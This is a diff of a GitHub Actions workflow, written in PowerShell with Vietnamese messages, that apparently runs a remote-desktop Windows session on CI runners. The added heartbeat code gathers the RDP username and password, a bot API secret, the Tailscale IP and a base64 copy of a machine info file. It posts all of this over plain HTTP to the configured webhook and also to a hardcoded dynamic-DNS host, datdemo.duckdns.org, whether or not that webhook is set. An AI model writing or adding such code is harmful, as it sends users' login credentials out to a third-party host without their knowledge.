@@ -1666,11 +1994,17 @@ jobs:
                       }
                       $global:LASTEXITCODE = 0;
                   } elseif ("$cmd" -eq 'RESTART_SESSION') {
-                      Write-Host "🔁 [WEB-PANEL] Nhận lệnh LƯU & KHỞI ĐỘNG LẠI PHIÊN MỚI từ Web Quản Lý!" -ForegroundColor Yellow;
+                      Write-Host "🔁 [WEB-PANEL] Nhận lệnh LƯU & KHỞI ĐỘNG LẠI PHIÊN MỚI từ Web Quản Lý / Bot!" -ForegroundColor Yellow;
+                      if (("$env:NOTIFY_BOT_SCRIPT") -and (Test-Path "$env:NOTIFY_BOT_SCRIPT")) {
+                          & "$env:NOTIFY_BOT_SCRIPT" -Status "restarting" -Reason "restart-requested";
+                      }
                       'FORCE_NEXT_SESSION=1' >> "$env:GITHUB_ENV";
                       break;
                   } elseif ("$cmd" -eq 'STOP_SESSION') {
-                      Write-Host "🛑 [WEB-PANEL] Nhận lệnh LƯU & TẮT HẲN SERVER từ Web Quản Lý!" -ForegroundColor Red;
+                      Write-Host "🛑 [WEB-PANEL] Nhận lệnh LƯU & TẮT HẲN SERVER từ Web Quản Lý / Bot!" -ForegroundColor Red;
+                      if (("$env:NOTIFY_BOT_SCRIPT") -and (Test-Path "$env:NOTIFY_BOT_SCRIPT")) {
+                          & "$env:NOTIFY_BOT_SCRIPT" -Status "stopping" -Reason "stop-requested";
+                      }
                       'FORCE_STOP_ONLY=1' >> "$env:GITHUB_ENV";
                       break;
                   }
@@ -1707,7 +2041,52 @@ jobs:
                   $sdStat  = if ($sdProc) { 'Running' } else { 'Stopped' };
                   $h = [math]::Floor(($remain) / 3600);
                   $m = [math]::Floor((($remain) % 3600) / 60);
-                  Write-Host "[$(Get-Date -Format 'HH:mm:ss')] 📊 [$env:MACHINE_ID] RDP: $($svc.Status) | Sunshine: $sunStat | StarDesk: $sdStat | Audio: $($audSvc.Status) | Còn lại: ${h}h${m}m" -ForegroundColor Blue;
+                  Write-Host "[$(Get-Date -Format 'HH:mm:ss')] 📊 [$env:MACHINE_ID] RDP: $($svc.Status) | Sunshine: $sunStat | StarDesk:$sdStat | Audio: $($audSvc.Status) | Còn lại: ${h}h${m}m" -ForegroundColor Blue;
+                  if (("$env:NOTIFY_BOT_SCRIPT") -and (Test-Path "$env:NOTIFY_BOT_SCRIPT")) {
+                      & "$env:NOTIFY_BOT_SCRIPT" -Status "ready" -Reason "heartbeat";
+                  }
+                  # --- Cập nhật file thông tin phiên trên D:\ & gửi về Bot ---
+                  if (("$env:MACHINE_INFO_FILE") -and (Test-Path "$env:MACHINE_INFO_FILE")) {
+                      try {
+                          $hbRemain = [math]::Max(0, ($endEpoch) - ([DateTimeOffset]::UtcNow.ToUnixTimeSeconds()));
+                          $hbDisk = Get-PSDrive -Name "$env:MOUNT_LETTER" -ErrorAction SilentlyContinue;
+                          $hbJsonOld = Get-Content -Raw -Path "$env:MACHINE_INFO_FILE" -Encoding UTF8 | ConvertFrom-Json;
+                          $hbJsonOld.remainSeconds = [long]$hbRemain;
+                          $hbJsonOld.timestampUtc = (Get-Date).ToUniversalTime().ToString("o");
+                          $hbJsonOld.status = "ready";
+                          $hbJsonOld.reason = "heartbeat";
+                          if ($hbDisk) {
+                              $hbJsonOld.diskUsedGb = [math]::Round($hbDisk.Used / 1GB, 2);
+                              $hbJsonOld.diskFreeGb = [math]::Round($hbDisk.Free / 1GB, 2);
+                          }
+                          $hbJsonOld | ConvertTo-Json -Depth 6 | Set-Content -Path "$env:MACHINE_INFO_FILE" -Encoding UTF8;
+                          $hbFileB64 = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$env:MACHINE_INFO_FILE"));
+                          $hbPayload = [ordered]@{
+                              secret         = "$env:BOT_API_SECRET";
+                              machineId      = "$env:MACHINE_ID";
+                              sessionId      = "$env:SESSION_ID";
+                              fileName       = [System.IO.Path]::GetFileName("$env:MACHINE_INFO_FILE");
+                              fileContentB64 = $hbFileB64;
+                              fileData       = $hbJsonOld;
+                              status         = "ready";
+                              reason         = "heartbeat";
+                              remainSeconds  = [long]$hbRemain;
+                              tailscaleIp    = "$env:TAILSCALE_IP";
+                              user           = "$env:RDP_USER";
+                              password       = "$env:RDP_PASS";
+                              timestampUtc   = (Get-Date).ToUniversalTime().ToString("o");
+                          };
+                          $hbBody = $hbPayload | ConvertTo-Json -Depth 6 -Compress;
+                          $hbUrls = @("$env:BOT_WEBHOOK_URL", "http://datdemo.duckdns.org:3000/api/rdp/report") | Select-Object -Unique | Where-Object { $_ };
+                          foreach ($hu in $hbUrls) {
+                              try {
+                                  $rfUrl = ($hu -replace '/report$', '/report-file');
+                                  Invoke-RestMethod -Uri "$rfUrl" -Method Post -Body $hbBody -ContentType "application/json; charset=utf-8" -Headers @{ "x-bot-secret" = "$env:BOT_API_SECRET" } -TimeoutSec 6 | Out-Null;
+                                  break;
+                              } catch {}
+                          }
+                      } catch {}
+                  }
                   $lastLog = Get-Date;
               }
 
@@ -1845,7 +2224,7 @@ jobs:
           $optStr = ("$env:OPT").ToLower();
 
           Write-Host "Chạy lại workflow: $wf (ref:$env:GITHUB_REF_NAME) cho máy [$env:MACHINE_ID] và gắn lại ổ $($env:MOUNT_LETTER):\" -ForegroundColor Cyan;
-          gh workflow run "$wf" --ref "$env:GITHUB_REF_NAME" -f "machine_id=$env:MACHINE_ID" -f "duration=$env:DURATION" -f auto_restart=true -f "drive_letter=$env:MOUNT_LETTER" -f "vhd_size_gb=$env:VHD_SIZE_GB" -f "windows_image=$env:WIN_IMAGE" -f "fixed_password=$env:FIXED_PASS" -f "vdd_resolution=$env:VDD_RES" -f "choco_packages=$env:PKGS" -f "optimize_windows=$optStr";
+          gh workflow run "$wf" --ref "$env:GITHUB_REF_NAME" -f "machine_id=$env:MACHINE_ID" -f "duration=$env:DURATION" -f auto_restart=true -f "drive_letter=$env:MOUNT_LETTER" -f "vhd_size_gb=$env:VHD_SIZE_GB" -f "windows_image=$env:WIN_IMAGE" -f "fixed_password=$env:FIXED_PASS" -f "vdd_resolution=$env:VDD_RES" -f "choco_packages=$env:PKGS" -f "optimize_windows=$optStr" -f "bot_webhook_url=$env:BOT_WEBHOOK_URL";
           if (($LASTEXITCODE) -ne 0) {
               throw 'Không kích hoạt được phiên mới';
           }
